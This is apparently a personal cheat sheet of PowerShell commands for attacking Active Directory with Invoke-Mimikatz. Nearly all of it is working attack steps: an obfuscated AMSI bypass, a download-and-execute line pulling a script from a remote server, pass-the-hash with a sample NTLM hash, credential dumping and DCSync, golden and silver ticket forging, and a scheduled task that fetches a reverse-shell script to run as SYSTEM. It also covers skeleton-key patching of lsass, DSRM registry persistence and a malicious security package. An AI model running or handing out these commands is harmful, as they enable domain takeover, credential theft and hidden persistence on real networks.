### Attacking Kerberos using Invoke-Mimikatz
# If AMSI is on, you need to obfuscate or bypass it
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;   (    GeT-VariaBle ( "1Q2U" + "zX"  ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation','s','System') )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
# If you have a file server to download from
iex (iwr http://IP/Invoke-Mimikatz.ps1)
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:sqldevadmin /domain:USFUN /ntlm:ce03434e2f83b99704a631ae56e2146e /run:powershell.exe"'
#Invoke-Mimikatz -Command '"sekurlsa::pth /user:<your user> /domain:<domain> /ntlm:<hash of user> /run:powershell.exe"'
# Gives a new shell, now create a new session
$sess = New-PSSession -ComputerName <DC or where ever>
Invoke-Command -Session $sess -FilePath .\Invoke-Mimikatz.ps1 #put file in session memory
Enter-PSSession -Session $sess
# Now you are in the new environment with the new creds, but the file you invoked is still in memory to run
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc or whoever>

# once you find the kbt, you can make a golden ticket!
Invoke-Mimikatz -Command '"
kerberos::golden 
/user:Administrator 
/domain:<domain> 
/sid: <sid of the domain> 
/krbtgt: <dump hash> 
/id:500 /groups:512 
/ticket             # this saves the ticket to a file for later, use '/ptt' for injecting into the current process
/startoffset:0      # When it is available, negative numbers puts it in the past
/endin:600          #lifetime, default for AD is 600 minutes
/renewmax:10080     # This is default AD setting
"'
# All together
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid: <sid of the domain> /krbtgt: <dump hash> /id:500 /groups:512 /ptt /startoffset:0 /endin:600 /renewmax:10080"'

# You could also do a DCSync attack
Invoke-Mimikatz -Command '"lsadump::dcsync /user:usfun\krbtgt"'

## Getting a silver ticket
# Forge a TGS by taking the hash of a service account and signing the ticket with the NTLM hash (step 5 of Kerberos)
Invoke-Mimikatz -Command '"  "'
kerberos::golden 
/user:Administrator 
/domain:<domain> 
/sid: <sid of the domain> 
/target:<FQDN or SPN
/service: CIFS   # or whatever service you want Go see https://adsecurity.org/?page_id=183 for the options here
/rc4:<NTLM hash from lsa dump> 
/ptt                #
/startoffset:0      # When it is available, negative numbers puts it in the past
/endin:600          #lifetime, default for AD is 600 minutes
/renewmax:10080     # This is default AD setting


#Once you have a ticket, look real quick
klist
# If you get a host ticket, you can create a task that returns a reverse shell!
schtasks /create /S UFC-JumpSrv /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe iex(New-Object Net.WebClient).DownloadString(''http://IP:port/Invoke-PowerShellTcp.ps1''')'"
# now that it is created, you can run it when you want
schtasks /Run /S UFC-JumpSrv /TN "STCheck"
# use powercat to be a netcat listener
powercat -l -v -p 443 -t 1000

#### Skeleton Keys
# Patch the domain controller  (lsass process) to allow access as any user with a single password
# Not persistent across reboots. Below gives password as "mimikatz"
# must be done with domain admin privileges, and can only be done once (lsass won't let you do it twice)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName DC
Enter-PSSession -ComputerName DC -Credential dcorp\administrator
# now this works anywhere

# If lsass runs as a protected process, you can still do this but VERY noisy
# Must copy of the mimidriv.sys to the target disk then run these:
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
# Now the skeleton key is in!

## DSRM password dump
# only available on a domain controller and you have domain admin privs already...just need persistence
Invoke-mimikatz -Command ' "token::elevate" "lsadump::sam" ' -ComputerName domaincontroller
# must change the logon behavior in the registry to allow logon
Enter-PSSession -Computername domaincontroller
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\LSA" -Name "DsrmAdminLogonBehavior" -Value 2
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\LSA"
# now you can past the hash with mimikatz using the domain controller
gci \\domaincontroller\C$


### Custom SSP
# Copy mimilib.dll to system32 directory
copy-item mimilib.dll C:\Windows\System32
# Update the registry
$pack = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$pack += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $pack
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $pack
# Now you can inject with mimikatz
Invoke-Mimikatz -Command '"misc::memssp"'
